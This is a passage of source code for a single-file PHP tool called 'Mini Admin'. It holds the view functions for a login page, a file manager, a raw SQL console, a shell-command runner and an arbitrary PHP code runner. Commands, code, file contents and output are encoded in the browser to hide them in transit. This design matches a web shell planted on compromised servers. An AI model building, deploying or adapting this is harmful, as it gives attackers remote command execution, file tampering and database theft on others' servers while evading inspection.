        return binaryToUtf8(atob(b64));
      }
      return { enc: enc, dec: dec };
    })();
  </script>
  <style>
    :root {
      --bg: #f6f1e7;
      --bg-2: #e7f1f0;
      --ink: #1f2933;
      --muted: #5b6675;
      --line: #e5dfd5;
      --card: #ffffff;
      --accent: #c2410c;
      --accent-2: #0f766e;
      --nav: #1f2a38;
      --nav-soft: #2a3a4f;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: "Palatino Linotype", "Book Antiqua", Palatino, Georgia, serif;
      color: var(--ink);
      background: linear-gradient(120deg, var(--bg), var(--bg-2) 60%, #f9f7f2);
      min-height: 100vh;
      position: relative;
    }
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background-image:
        radial-gradient(circle at 20% 20%, rgba(194, 65, 12, 0.08), transparent 40%),
        radial-gradient(circle at 80% 10%, rgba(15, 118, 110, 0.10), transparent 45%),
        radial-gradient(circle at 10% 85%, rgba(194, 65, 12, 0.06), transparent 35%);
      pointer-events: none;
      z-index: 0;
    }
    .topbar {
      position: relative;
      z-index: 1;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 14px 22px;
      background: linear-gradient(90deg, #1f2933, #2f3d4f);
      color: #f8fafc;
      box-shadow: 0 6px 14px rgba(31, 41, 51, 0.2);
    }
    .logo { font-weight: 700; letter-spacing: 0.8px; text-transform: uppercase; font-size: 14px; }
    .user a { color: #fde68a; text-decoration: none; margin-left: 12px; }
    .layout { position: relative; z-index: 1; display: flex; min-height: calc(100vh - 56px); }
    .sidebar {
      width: 210px;
      background: var(--nav);
      padding: 16px 12px;
      border-right: 1px solid rgba(255, 255, 255, 0.06);
    }
    .sidebar a {
      display: block;
      padding: 10px 12px;
      color: #d1d5db;
      text-decoration: none;
      border-radius: 10px;
      margin-bottom: 6px;
      transition: background 0.2s ease, color 0.2s ease;
    }
    .sidebar a.active, .sidebar a:hover { background: var(--nav-soft); color: #fff; }
    .main { flex: 1; padding: 24px; }
    .main h1 { margin: 0 0 16px 0; font-size: 28px; letter-spacing: 0.4px; animation: fadeIn 0.4s ease; }
    .card {
      background: var(--card);
      border-radius: 14px;
      padding: 18px;
      border: 1px solid rgba(31, 41, 51, 0.08);
      box-shadow: 0 12px 26px rgba(31, 41, 51, 0.08);
      margin-bottom: 18px;
      animation: cardIn 0.5s ease both;
    }
    details.collapse > summary {
      cursor: pointer;
      font-weight: 600;
      color: #1f2a38;
      margin-bottom: 12px;
      list-style: none;
    }
    details.collapse > summary::-webkit-details-marker { display: none; }
    .card:nth-of-type(2) { animation-delay: 0.05s; }
    .card:nth-of-type(3) { animation-delay: 0.1s; }
    .flash { padding: 10px 12px; border-radius: 10px; margin-bottom: 12px; }
    .flash.success { background: #ecfdf3; color: #046c4e; }
    .flash.error { background: #fef2f2; color: #b91c1c; }
    .flash.info { background: #eff6ff; color: #1d4ed8; }
    table { width: 100%; border-collapse: collapse; }
    th, td { padding: 9px 10px; text-align: left; border-bottom: 1px solid var(--line); }
    th { font-weight: 600; color: #374151; background: #f7f1e7; }
    .muted { color: var(--muted); }
    .actions form { display: inline-block; margin: 6px 8px 6px 0; }
    .actions input[type="text"] { width: 1700px; }
    .actions input, .actions select, .actions textarea, .actions button {
      padding: 7px 10px;
      border: 1px solid #d2c7b9;
      border-radius: 8px;
      background: #fffdf9;
    }
    .actions button {
      background: linear-gradient(135deg, var(--accent), #f59e0b);
      border: none;
      color: #fff;
      cursor: pointer;
      transition: transform 0.15s ease, box-shadow 0.15s ease;
    }
    .actions button:hover { transform: translateY(-1px); box-shadow: 0 6px 16px rgba(194, 65, 12, 0.2); }
    .actions button.secondary { background: linear-gradient(135deg, #64748b, #475569); }
    .tag {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 999px;
      background: rgba(15, 118, 110, 0.12);
      color: #0f766e;
      font-size: 12px;
      text-decoration: none;
    }
    textarea { width: 100%; min-height: 320px; font-family: "Consolas", "Courier New", monospace; background: #fbf8f2; }
    pre { background: #111827; color: #e5e7eb; padding: 12px; border-radius: 10px; overflow: auto; }
    .path { margin-bottom: 12px; }
    .path a { color: #0f766e; text-decoration: none; }
    @keyframes cardIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    @media (max-width: 900px) {
      .layout { flex-direction: column; }
      .sidebar { width: 100%; display: flex; overflow-x: auto; }
      .sidebar a { white-space: nowrap; margin-right: 8px; }
      .main { padding: 18px; }
    }
  </style>
</head>
<body>
  <div class="topbar">
    <div class="logo">Mini Admin</div>
    <div class="user">
      <?php echo App::h($user); ?>
      <a href="?r=logout">Logout</a>
    </div>
  </div>
  <div class="layout">
    <nav class="sidebar">
      <?php foreach ($nav as $key => $label): ?>
        <a class="<?php echo $key === $route ? 'active' : ''; ?>" href="?r=<?php echo App::h($key); ?>"><?php echo App::h($label); ?></a>
      <?php endforeach; ?>
    </nav>
    <main class="main">
      <h1><?php echo App::h($title); ?></h1>
      <?php if (!empty($runtimeErrors)): ?>
        <?php foreach ($runtimeErrors as $err): ?>
          <div class="flash error"><?php echo App::h($err); ?></div>
        <?php endforeach; ?>
      <?php endif; ?>
      <?php if ($flash): ?>
        <div class="flash <?php echo App::h($flash['type']); ?>"><?php echo App::h($flash['msg']); ?></div>
      <?php endif; ?>
      <?php echo $body; ?>
    </main>
  </div>
</body>
</html>
    <?php
  }

  public static function login() {
    $flash = App::flash();
    $csrf = App::csrfToken();
    ?>
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login</title>
  <style>
    :root {
      --bg: #f6f1e7;
      --bg-2: #e7f1f0;
      --ink: #1f2933;
      --muted: #5b6675;
      --line: #e5dfd5;
      --card: #ffffff;
      --accent: #c2410c;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: "Palatino Linotype", "Book Antiqua", Palatino, Georgia, serif;
      background: linear-gradient(120deg, var(--bg), var(--bg-2) 60%, #f9f7f2);
      color: var(--ink);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      position: relative;
    }
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background-image:
        radial-gradient(circle at 20% 20%, rgba(194, 65, 12, 0.1), transparent 40%),
        radial-gradient(circle at 80% 10%, rgba(15, 118, 110, 0.12), transparent 45%);
      pointer-events: none;
    }
    .card {
      background: var(--card);
      padding: 28px;
      border-radius: 16px;
      width: 340px;
      border: 1px solid rgba(31, 41, 51, 0.08);
      box-shadow: 0 18px 36px rgba(31, 41, 51, 0.12);
      position: relative;
      z-index: 1;
    }
    h1 { margin-top: 0; font-size: 24px; letter-spacing: 0.4px; }
    label { display: block; margin-top: 12px; color: var(--muted); }
    input {
      width: 100%;
      padding: 10px 12px;
      border-radius: 8px;
      border: 1px solid #d2c7b9;
      margin-top: 6px;
      background: #fffdf9;
    }
    button {
      margin-top: 18px;
      width: 100%;
      padding: 10px 12px;
      background: linear-gradient(135deg, var(--accent), #f59e0b);
      border: none;
      border-radius: 8px;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
    }
    .flash {
      margin-top: 12px;
      padding: 8px 10px;
      border-radius: 6px;
      background: #fef2f2;
      color: #b91c1c;
    }
  </style>
</head>
<body>
  <form class="card" method="post" action="?r=login">
    <h1>Sign in</h1>
    <label for="user">Username</label>
    <input id="user" name="user" type="text" required>
    <label for="pass">Password</label>
    <input id="pass" name="pass" type="password" required>
    <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
    <button type="submit">Login</button>
    <?php if ($flash): ?>
      <div class="flash"><?php echo App::h($flash['msg']); ?></div>
    <?php endif; ?>
  </form>
</body>
</html>
    <?php
  }

  public static function dashboard() {
    $base = Files::base();
    $cfg = App::config();
    ob_start();
    ?>
    <div class="card">
      <div><strong>Base path:</strong> <?php echo App::h($base); ?></div>
      <div><strong>Crypto:</strong> <?php echo $cfg['crypto'] ? 'On' : 'Off'; ?></div>
      <div><strong>Command:</strong> <?php echo $cfg['enable_cmd'] ? 'Enabled' : 'Disabled'; ?></div>
      <div><strong>DB host:</strong> <?php echo App::h($cfg['db']['host']); ?></div>
    </div>
    <div class="card">
      <div class="muted">Use the sidebar to access modules.</div>
    </div>
    <?php
    return ob_get_clean();
  }

  public static function files($data) {
    $cwd = $data['cwd'];
    $items = $data['items'];
    $csrf = App::csrfToken();
    $segments = $cwd === '' ? [] : explode('/', $cwd);
    $absoluteUnix = strpos($cwd, '/') === 0;
    $cwdDisplay = $cwd === '' ? Files::base() : $cwd;
    $crumbs = [];
    $path = $absoluteUnix ? '/' : '';
    foreach ($segments as $seg) {
      if ($seg === '') {
        continue;
      }
      if ($path === '' && preg_match('/^[A-Za-z]:$/', $seg)) {
        $path = $seg;
      } else {
        $path = rtrim($path, '/') . '/' . $seg;
      }
      $crumbs[] = ['name' => $seg, 'path' => $path];
    }
    ob_start();
    ?>
    <div class="card">
      <div class="path">
        <strong>Path:</strong>
        <a href="?r=files">/</a>
        <?php foreach ($crumbs as $crumb): ?>
          / <a href="?r=files&p=<?php echo App::h(App::enc($crumb['path'])); ?>"><?php echo App::h($crumb['name']); ?></a>
        <?php endforeach; ?>
      </div>
      <div class="actions">
        <form method="get">
          <input type="hidden" name="r" value="files">
          <input type="text" name="path" value="<?php echo App::h($cwdDisplay); ?>" placeholder="Enter path">
          <button type="submit" class="secondary">Go</button>
        </form>
      </div>
      <div class="actions">
        <form method="post">
          <input type="hidden" name="r" value="files">
          <input type="hidden" name="action" value="mkdir">
          <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="text" name="name" placeholder="New folder">
          <button type="submit">Create Folder</button>
        </form>
        <form method="post">
          <input type="hidden" name="r" value="files">
          <input type="hidden" name="action" value="touch">
          <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="text" name="name" placeholder="New file">
          <button type="submit" class="secondary">Create File</button>
        </form>
        <form method="post" enctype="multipart/form-data">
          <input type="hidden" name="r" value="files">
          <input type="hidden" name="action" value="upload">
          <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="file" name="upload">
          <button type="submit">Upload</button>
        </form>
      </div>
    </div>
    <div class="card">
      <table>
        <thead>
          <tr>
            <th>Name</th>
            <th>Type</th>
            <th>Size</th>
            <th>Modified</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody>
        <?php if (empty($items)): ?>
          <tr><td colspan="5" class="muted">Empty directory.</td></tr>
        <?php else: ?>
          <?php foreach ($items as $item): ?>
            <tr>
              <td>
                <?php if ($item['is_dir']): ?>
                  <a href="?r=files&p=<?php echo App::h(App::enc($item['rel'])); ?>"><?php echo App::h($item['name']); ?></a>
                <?php else: ?>
                  <?php echo App::h($item['name']); ?>
                <?php endif; ?>
              </td>
              <td><?php echo $item['is_dir'] ? 'Dir' : 'File'; ?></td>
              <td><?php echo $item['is_dir'] ? '-' : number_format($item['size']); ?></td>
              <td><?php echo $item['mtime'] ? date('Y-m-d H:i', $item['mtime']) : '-'; ?></td>
              <td class="actions">
                <?php if (!$item['is_dir']): ?>
                  <a class="tag" href="?r=editor&file=<?php echo App::h(App::enc($item['rel'])); ?>">Edit</a>
                  <a class="tag" href="?r=files&action=download&file=<?php echo App::h(App::enc($item['rel'])); ?>&p=<?php echo App::h(App::enc($cwd)); ?>">Download</a>
                <?php endif; ?>
                <form method="post" style="display:inline;">
                  <input type="hidden" name="r" value="files">
                  <input type="hidden" name="action" value="delete">
                  <input type="hidden" name="p" value="<?php echo App::h(App::enc($cwd)); ?>">
                  <input type="hidden" name="target" value="<?php echo App::h(App::enc($item['rel'])); ?>">
                  <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
                  <button type="submit" class="secondary">Delete</button>
                </form>
              </td>
            </tr>
          <?php endforeach; ?>
        <?php endif; ?>
        </tbody>
      </table>
    </div>
    <?php
    return ob_get_clean();
  }

  public static function editor($data) {
    $csrf = App::csrfToken();
    $file = $data['file'];
    $contentEnc = Crypto::enc($data['content']);
    ob_start();
    ?>
    <div class="card">
      <?php if ($data['error'] !== ''): ?>
        <div class="flash error"><?php echo App::h($data['error']); ?></div>
      <?php else: ?>
        <div class="path"><strong>File:</strong> <?php echo App::h($file); ?></div>
        <form method="post">
          <input type="hidden" name="r" value="editor">
          <input type="hidden" name="action" value="save">
          <input type="hidden" name="file" value="<?php echo App::h(App::enc($file)); ?>">
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="hidden" name="content_enc" id="editor-content-enc" value="<?php echo App::h($contentEnc); ?>">
          <textarea id="editor-content" aria-label="File content"></textarea>
          <div class="actions" style="margin-top:10px;">
            <button type="submit">Save</button>
          </div>
          <noscript>
            <div class="flash error" style="margin-top:12px;">JavaScript required to edit encrypted content.</div>
          </noscript>
        </form>
        <script>
          (function () {
            var textarea = document.getElementById('editor-content');
            var encInput = document.getElementById('editor-content-enc');
            var crypto = window.fmCrypto;
            if (!textarea || !encInput || !crypto) {
              return;
            }
            try {
              textarea.value = crypto.dec(encInput.value);
            } catch (e) {
              textarea.value = '';
            }
            if (textarea.form) {
              textarea.form.addEventListener('submit', function () {
                encInput.value = crypto.enc(textarea.value);
              });
            }
          })();
        </script>
      <?php endif; ?>
    </div>
    <?php
    return ob_get_clean();
  }

  public static function db($data) {
    $csrf = App::csrfToken();
    $cfg = $data['cfg'];
    ob_start();
    ?>
    <div class="card">
      <form method="post" class="actions">
        <input type="hidden" name="r" value="db">
        <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
        <input type="text" name="host" value="<?php echo App::h($cfg['host']); ?>" placeholder="Host">
        <input type="text" name="port" value="<?php echo App::h((string)$cfg['port']); ?>" placeholder="Port">
        <input type="text" name="user" value="<?php echo App::h($cfg['user']); ?>" placeholder="User">
        <input type="password" name="pass" placeholder="Password (leave blank to keep)">
        <input type="text" name="name" value="<?php echo App::h($cfg['name']); ?>" placeholder="Database">
        <button type="submit" name="action" value="connect">Connect</button>
        <button type="submit" name="action" value="disconnect" class="secondary">Disconnect</button>
      </form>
    </div>
    <div class="card">
      <?php if (!$data['enabled']): ?>
        <div class="flash error"><?php echo App::h($data['error']); ?></div>
      <?php else: ?>
        <?php if ($data['error'] !== ''): ?>
          <div class="flash error"><?php echo App::h($data['error']); ?></div>
        <?php endif; ?>
        <form method="get" class="actions">
          <input type="hidden" name="r" value="db">
          <label>Database</label>
          <select name="db">
            <?php foreach ($data['dbs'] as $db): ?>
              <option value="<?php echo App::h(App::enc($db)); ?>" <?php echo $db === $data['db'] ? 'selected' : ''; ?>>
                <?php echo App::h($db); ?>
              </option>
            <?php endforeach; ?>
          </select>
          <label>Table</label>
          <select name="table">
            <?php foreach ($data['tables'] as $table): ?>
              <option value="<?php echo App::h(App::enc($table)); ?>" <?php echo $table === $data['table'] ? 'selected' : ''; ?>>
                <?php echo App::h($table); ?>
              </option>
            <?php endforeach; ?>
          </select>
          <button type="submit">Load</button>
          <?php if ($data['db'] !== '' && $data['table'] !== ''): ?>
            <a class="tag" href="?r=db&action=export&db=<?php echo App::h(App::enc($data['db'])); ?>&table=<?php echo App::h(App::enc($data['table'])); ?>">Export CSV</a>
          <?php endif; ?>
        </form>
      <?php endif; ?>
    </div>
    <div class="card">
      <form method="post">
        <input type="hidden" name="r" value="db">
        <input type="hidden" name="action" value="sql">
        <input type="hidden" name="db" value="<?php echo App::h(App::enc($data['db'])); ?>">
        <input type="hidden" name="table" value="<?php echo App::h(App::enc($data['table'])); ?>">
        <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
        <label>SQL</label>
        <textarea name="sql" rows="6"><?php echo App::h($data['sql']); ?></textarea>
        <div class="actions" style="margin-top:10px;">
          <button type="submit">Run SQL</button>
        </div>
      </form>
      <?php if ($data['sql_error'] !== ''): ?>
        <div class="flash error"><?php echo App::h($data['sql_error']); ?></div>
      <?php elseif (is_array($data['sql_result'])): ?>
        <?php if ($data['sql_result']['type'] === 'exec'): ?>
          <div class="flash info">Rows affected: <?php echo App::h((string)$data['sql_result']['count']); ?></div>
        <?php elseif ($data['sql_result']['type'] === 'select'): ?>
          <div class="flash info">Rows: <?php echo count($data['sql_result']['rows']); ?></div>
          <?php if (!empty($data['sql_result']['rows'])): ?>
            <pre><?php echo App::h(json_encode($data['sql_result']['rows'], JSON_PRETTY_PRINT)); ?></pre>
          <?php endif; ?>
        <?php endif; ?>
      <?php endif; ?>
    </div>
    <?php if (!empty($data['rows'])): ?>
      <div class="card">
        <details class="collapse" <?php echo $data['sql_ran'] ? '' : 'open'; ?>>
          <summary>Table preview (<?php echo count($data['rows']); ?> rows)</summary>
          <table>
            <thead>
              <tr>
                <?php foreach (array_keys($data['rows'][0]) as $col): ?>
                  <th><?php echo App::h($col); ?></th>
                <?php endforeach; ?>
              </tr>
            </thead>
            <tbody>
              <?php foreach ($data['rows'] as $row): ?>
                <tr>
                  <?php foreach ($row as $val): ?>
                    <td><?php echo App::h((string)$val); ?></td>
                  <?php endforeach; ?>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </details>
      </div>
    <?php endif; ?>
    <?php
    return ob_get_clean();
  }

  public static function cmd($data) {
    $csrf = App::csrfToken();
    $cmdEnc = Crypto::enc($data['cmd']);
    $outputEnc = $data['output'] !== '' ? Crypto::enc($data['output']) : '';
    ob_start();
    ?>
    <div class="card">
      <?php if (!$data['enabled']): ?>
        <div class="muted">Command module disabled.</div>
      <?php elseif ($data['error'] !== ''): ?>
        <div class="flash error"><?php echo App::h($data['error']); ?></div>
      <?php endif; ?>
      <?php if ($data['enabled'] && $data['supported']): ?>
        <div class="muted" style="margin-bottom:8px;">
          Available methods: <?php echo App::h(implode(', ', $data['methods'])); ?>
        </div>
        <form method="post">
          <input type="hidden" name="r" value="cmd">
          <input type="hidden" name="action" value="run">
          <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
          <input type="hidden" name="cmd_enc" id="cmd-enc" value="<?php echo App::h($cmdEnc); ?>">
          <input type="text" id="cmd-input" placeholder="Command" aria-label="Command">
          <button type="submit">Execute</button>
        </form>
        <noscript>
          <div class="flash error" style="margin-top:12px;">JavaScript required to submit encrypted commands.</div>
        </noscript>
      <?php endif; ?>
      <?php if ($data['method'] !== ''): ?>
        <div style="margin-top:12px;">
          <div class="muted">Method: <?php echo App::h($data['method']); ?></div>
          <div class="muted">Exit code: <?php echo App::h((string)$data['exit_code']); ?></div>
          <?php if ($outputEnc !== ''): ?>
            <pre id="cmd-output" data-enc="<?php echo App::h($outputEnc); ?>"></pre>
          <?php endif; ?>
        </div>
      <?php endif; ?>
    </div>
    <script>
      (function () {
        var crypto = window.fmCrypto;
        var cmdInput = document.getElementById('cmd-input');
        var cmdEnc = document.getElementById('cmd-enc');
        if (cmdInput && cmdEnc && crypto) {
          try {
            cmdInput.value = crypto.dec(cmdEnc.value);
          } catch (e) {
            cmdInput.value = '';
          }
          if (cmdInput.form) {
            cmdInput.form.addEventListener('submit', function () {
              cmdEnc.value = crypto.enc(cmdInput.value);
            });
          }
        }
        var outputEl = document.getElementById('cmd-output');
        if (outputEl && outputEl.dataset.enc && crypto) {
          try {
            outputEl.textContent = crypto.dec(outputEl.dataset.enc);
          } catch (e) {
            outputEl.textContent = '';
          }
        }
      })();
    </script>
    <?php
    return ob_get_clean();
  }

  public static function php($data) {
    $csrf = App::csrfToken();
    $codeEnc = Crypto::enc($data['code']);
    $outputEnc = $data['output'] !== '' ? Crypto::enc($data['output']) : '';
    $returnEnc = $data['return'] !== '' ? Crypto::enc($data['return']) : '';
    ob_start();
    ?>
    <div class="card">
      <form method="post">
        <input type="hidden" name="r" value="php">
        <input type="hidden" name="action" value="run">
        <input type="hidden" name="csrf" value="<?php echo App::h($csrf); ?>">
        <input type="hidden" name="code_enc" id="php-code-enc" value="<?php echo App::h($codeEnc); ?>">
        <textarea id="php-code" placeholder="Enter PHP code (no &lt;?php tag)"></textarea>
        <div class="actions" style="margin-top:10px;">
          <button type="submit">Run PHP</button>
        </div>
      </form>
      <noscript>
        <div class="flash error" style="margin-top:12px;">JavaScript required to submit encrypted code.</div>
      </noscript>
      <?php if ($data['error'] !== ''): ?>
        <div class="flash error" style="margin-top:12px;"><?php echo App::h($data['error']); ?></div>
      <?php endif; ?>
      <?php if ($data['ran']): ?>
        <div style="margin-top:12px;">
          <?php if ($outputEnc !== ''): ?>
            <div class="muted">Output</div>
            <pre id="php-output" data-enc="<?php echo App::h($outputEnc); ?>"></pre>
          <?php endif; ?>
          <?php if ($returnEnc !== ''): ?>
            <div class="muted" style="margin-top:8px;">Return</div>
            <pre id="php-return" data-enc="<?php echo App::h($returnEnc); ?>"></pre>
          <?php endif; ?>
        </div>
      <?php endif; ?>
    </div>
    <script>
      (function () {
        var crypto = window.fmCrypto;
        var codeInput = document.getElementById('php-code');
        var codeEnc = document.getElementById('php-code-enc');
        if (codeInput && codeEnc && crypto) {
          try {
            codeInput.value = crypto.dec(codeEnc.value);
          } catch (e) {
            codeInput.value = '';
          }
          if (codeInput.form) {
            codeInput.form.addEventListener('submit', function () {
              codeEnc.value = crypto.enc(codeInput.value);
            });
          }
        }
        var outEl = document.getElementById('php-output');
        if (outEl && outEl.dataset.enc && crypto) {
          try {
            outEl.textContent = crypto.dec(outEl.dataset.enc);
          } catch (e) {
            outEl.textContent = '';
          }
        }
        var retEl = document.getElementById('php-return');
        if (retEl && retEl.dataset.enc && crypto) {
          try {
            retEl.textContent = crypto.dec(retEl.dataset.enc);
          } catch (e) {
            retEl.textContent = '';
          }
        }
      })();
    </script>
    <?php
    return ob_get_clean();
  }

  public static function system() {
    $cfg = App::config();
    $os = defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS;
    ob_start();
    ?>
    <div class="card">
      <table>
        <tr><th>PHP Version</th><td><?php echo App::h(PHP_VERSION); ?></td></tr>
        <tr><th>OS</th><td><?php echo App::h($os); ?></td></tr>
        <tr><th>Server Time</th><td><?php echo App::h(date('Y-m-d H:i:s')); ?></td></tr>
        <tr><th>Base Path</th><td><?php echo App::h($cfg['base_path']); ?></td></tr>
        <tr><th>Crypto</th><td><?php echo $cfg['crypto'] ? 'On' : 'Off'; ?></td></tr>
        <tr><th>Command</th><td><?php echo $cfg['enable_cmd'] ? 'Enabled' : 'Disabled'; ?></td></tr>
      </table>
    </div>
    <?php
    return ob_get_clean();
  }

  private static function navItems() {
    $items = [
      'dashboard' => 'Dashboard',
      'files' => 'Files',
      'db' => 'Database',
      'editor' => 'Editor',
      'cmd' => 'Command',
      'php' => 'PHP',
      'system' => 'System',
    ];
    if (!App::config('enable_cmd')) {
      unset($items['cmd']);
    }
    return $items;
  }
}

class Log {
  public static function write($action, $detail = '') {
    if (!App::config('log')) {
      return;
    }
    $user = Auth::user();
    $line = date('c') . ' ' . $user . ' ' . $action . ' ' . $detail . "\n";
    @file_put_contents(App::config('log_file'), $line, FILE_APPEND | LOCK_EX);
  }
}

App::initErrorHandling();

$route = (string)App::param('r', 'dashboard');
App::dispatch($route);
